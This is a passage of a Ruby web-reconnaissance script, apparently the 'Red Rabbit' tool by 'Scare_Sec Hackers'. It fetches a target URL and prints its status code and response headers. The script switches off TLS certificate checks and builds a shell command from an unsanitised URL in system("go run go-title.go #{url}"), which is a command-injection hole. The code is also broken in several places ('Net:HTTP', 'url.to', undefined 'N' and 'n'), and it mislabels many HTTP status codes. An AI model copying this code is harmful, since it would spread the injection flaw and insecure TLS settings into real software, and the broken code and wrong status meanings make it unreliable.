            V 3.0                                 Red Rabbit               Scare_Sec Hackers
                                                    
                                                    ((`\
                                                ___ \\ '--._
                                            .'`   `'    o  )
                                            /    \   '. __.'
                                            _|    /_  \ \_\_
                                        {_\______\-'\__\_\
                                            -----------------
        EOF
    end

    banner_help()

    date = Time.new 
    puts  '         Date At Start ===> '.colorize(:yellow) + date.inspect .colorize(:red)
    puts  '         Url Target    ===> '.colorize(:yellow) + url    .colorize(:red)
    puts  '         WWW Target    ===> '.colorize(:yellow) + domain .colorize(:red)
    puts '-------------------------------------------------------'
    puts "[*] Target is => ".colorize(:blue) + url.colorize(:red)
    puts '-------------------------------------------------------'  
    sleep 1 
    puts '[*] Gathering Info on URL => '.colorize(:blue) + url.colorize(:red)
    sleep 3 
    resur = Net::HTTP.get_response(URI.parse(url.to_s))




    if resur.code == '200'
        puts '[+] Connection OK' 
    elsif resur.code == '301'
        puts '[+] good'
    elsif resur.code == '302'
        puts '[+] Domain not found'
    elsif resur.code == '202'
        puts '[+] Domain Accepted IPA'
    elsif resur.code == '201'
        puts '[+] Domain Created'
    elsif resur.code == '204'
        puts '[-] hmmm not much content here'
    elsif resur.code == '206'
        puts '[-] little content, but why?.....'
    elsif resur.code == '303'
        puts '[-] See another page'
    elsif resur.code == '304'
        puts '[-] Domain Isnt modified yet'
    elsif resur.code == '305'
        puts '[-] try using proxies'
    elsif resur.code == '308'
        puts '[-] perma redirect'
    elsif resur.code == '400'
        puts '[-] Bad Request'
    elsif resur.code == '403'
        puts '[-] your ip is not wanted here'
    elsif resur.code == '405'
        puts '[-] unwanted domain'
    elsif resur.code == '404'
        puts '[-] Domain Not Foud'
    elsif resur.code == '423'
        puts '[-] locked domain'
    elsif resur.code == '425'
        puts '[-] too eraly'
    elsif resur.code == '429'
        puts '[-] way to much requests'
    elsif resur.code == '413'
        puts '[-] Payload to large'
    elsif resur.code == '407'
        puts '[-] hmmmm proxy auth is needed'
    elsif resur.code == '410'
        puts '[-] Domain Gone '
    elsif resur.code == '500'
        puts '[-] Server Side Error'
    elsif resur.code == '503'
        puts '[-] Server Unavalible/Offline'
    else
        puts '[-] Server May be offline '
        puts '[+] Trying a new request '
        sleep 1 
        resur = Net:HTTP.get_response(URI.parse(url.to))
        if resur.code == '200'
            puts '[+] Connection OK'.colorize(:blue)
        elsif resur.code == '301'
            puts '[+] good'
        elsif resur.code == '302'
            puts '[+] Domain not found'
        elsif resur.code == '202'
            puts '[+] Domain Accepted IPA'
        elsif resur.code == '201'
            puts '[+] Domain Created'
        elsif resur.code == '204'
            puts '[-] hmmm not much content here'
        elsif resur.code == '206'
            puts '[-] little content, but why?.....'
        elsif resur.code == '303'
            puts '[-] See another page'
        elsif resur.code == '304'
            puts '[-] Domain Isnt modified yet'
        elsif resur.code == '305'
            puts '[-] try using proxies'
        elsif resur.code == '308'
            puts '[-] perma redirect'
        elsif resur.code == '400'
            puts '[-] Bad Request'
        elsif resur.code == '403'
            puts '[-] your ip is not wanted here'
        elsif resur.code == '405'
            puts '[-] unwanted domain'
        elsif resur.code == '404'
            puts '[-] Domain Not Foud'
        elsif resur.code == '423'
            puts '[-] locked domain'
        elsif resur.code == '425'
            puts '[-] too eraly'
        elsif resur.code == '429'
            puts '[-] way to much requests'
        elsif resur.code == '413'
            puts '[-] Payload to large'
        elsif resur.code == '407'
            puts '[-] hmmmm proxy auth is needed'
        elsif resur.code == '410'
            puts '[-] Domain Gone '
        elsif resur.code == '500'
            puts '[-] Server Side Error'
        elsif resur.code == '503'
            puts '[-] Server Unavalible/Offline'
        else
            puts '[-] Second Test Failed '
        end
    end

    puts '---------------- BASIC INFORMATION FOR URL -------------- '
    uri = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)

    request = Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] = "My Ruby Script"
    request["Accept"] = "*/*"

    response = http.request(request)
    response["content-type"]

    response.each_header do |key, value|
    p "#{key} => #{value}"
    end
    p response.instance_variable_get("@header")
    puts '-------------------------'
    puts '[*] Response ~> '.colorize(:blue) + resur.code.colorize(:red)
    sleep 0.1
    puts '[*] Checking More Connections..'.colorize(:yellow)
    puts '--------------------------'
    puts '[*] Gathering Header Info....'.colorize(:yellow)
    puts "[!] Warning, upon further testing of #{__FILE__}
    [!] Sometimes the server info will go empty
    [!] Right now i am planning on fixing this bug 
    [!] and massive issue, however this project
    [!] was programmed over the course of a month
    ".colorize(:yellow)
    a = HTTParty.get(url).headers

    ip = IPAddr.new(N)


    map = ip.ipv4_compat.to_string

    puts '[*] Query          => '.colorize(:blue) , uri.query  
    puts '[*] Scheme         => '.colorize(:blue) , uri.scheme
    puts '[*] Port  Main     => '.colorize(:blue) , uri.port
    puts '[*] HOSTNAME       => '.colorize(:blue) , uri.host
    puts '[*] Path           => '.colorize(:blue) , uri.path
    puts '[*] Request URI    => '.colorize(:blue) , uri.request_uri 
    puts '[*] Server         => '.colorize(:blue) +  a["server"].colorize(:red)
    puts '[*] Date           => '.colorize(:blue) +  a["date"].colorize(:red)
    puts '[*] Content        => '.colorize(:blue) +  a["content-type"].colorize(:red)
    puts '[*] Response Code  => '.colorize(:blue) + resur.code
    puts '[*] Last-mod       => '.colorize(:blue) 
    puts a["last-modified"]
    puts '[*] trans-enc      => '.colorize(:blue) 
    puts a["transfer-encoding"]
    puts '[*] Connection     => '.colorize(:blue) + a["connection"].colorize(:red)
    puts '[*] Access-control => '.colorize(:blue) 
    puts a["access-control-allow-origin"]
    puts '[*] Cache-control  => '.colorize(:blue) 
    puts resur.response["Cache-Control"]
    puts '-----------------------SERVER INF--------------------'  
    puts '[*] Calculated IPV6 | '.colorize(:blue) + map .colorize(:red)                   
    puts '[*] Server IP       | '.colorize(:blue) + n .colorize(:red)
    puts '[*] X-Frame-OP      | '.colorize(:blue) 
    puts resur.response["x-frame-options"]
    puts '[*] X-XSS-Protect   | '.colorize(:blue) 
    puts  resur.response["x-xss-protection"]
    puts '[*] X-Content-type  | '.colorize(:blue) 
    puts resur.response["x-content-type-options"]
    puts '[*] Max-Age         |'.colorize(:blue) 
    puts resur.response["max-age"]
    puts '[*] X-Request-ID    |'.colorize(:blue)
    puts resur.response["x-request-id"]
    puts '[*] X-Runtime       |'.colorize(:blue)
    puts resur.response["x-runtime"]
    puts '[*] Access Control  |'.colorize(:blue)
    puts resur.response["access_control_max_age"]
    puts '[*] Access Allow    |'.colorize(:blue)
    puts resur.response["access_control_allow_methods"]
    puts '[*] Content Length  |'.colorize(:blue)
    puts resur.response["content-length"]
    puts '[*] Connection      |'.colorize(:blue)
    puts resur.response["connection"]
    puts '[*] Content_Dispo   |'.colorize(:blue)
    puts resur.response["content_disposition"]
    puts '[*] Expires         |'.colorize(:blue)
    puts resur.response["expires"]
    puts '[*] set-cookie      |'.colorize(:blue)
    puts resur.response["set-cookie"]
    puts '[*] user-Agent      |'.colorize(:blue)
    puts resur.response["user-agent"]
    puts '[*] bfcache-opt-in  |'.colorize(:blue)
    puts resur.response["bfcache-opt-in"]
    puts '[*] Content encode  | '.colorize(:blue)
    puts resur.response["content-encoding"]
    puts '[*] content-sec     | '.colorize(:blue)
    puts resur.response["content-security-policy"]
    puts '[*] Session Cookie  |'.colorize(:blue)
    puts resur.response["set-cookie"]
    puts '[*] strict-trans    |'.colorize(:blue)
    puts resur.response["strict-transport-security"]
    puts '[*] method          |'.colorize(:blue)
    puts resur.response["method"]
    puts '----------------------------------------------------------'
    puts '----------------------------------------------------------'
    proxy_user = nil
    proxy_pass = nil 

    uri  = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)

    http.use_ssl        = true if uri.scheme == 'https'
    http.verify_mode    = OpenSSL::SSL::VERIFY_NONE

    req  = Net::HTTP::Get.new(uri.request_uri)
    pp req.to_hash
    req["User-Agent"] = "Black Hat Ruby"

    res   = http.request(req)

    res.code
    res.message 
    res.code_type
    res.content_type
    pp res.to_hash
    puts '------------------- HOST TO DNS ----------------'
    system("go run go-title.go #{url}")
end

#check() 
system("clear")
main()
menu()


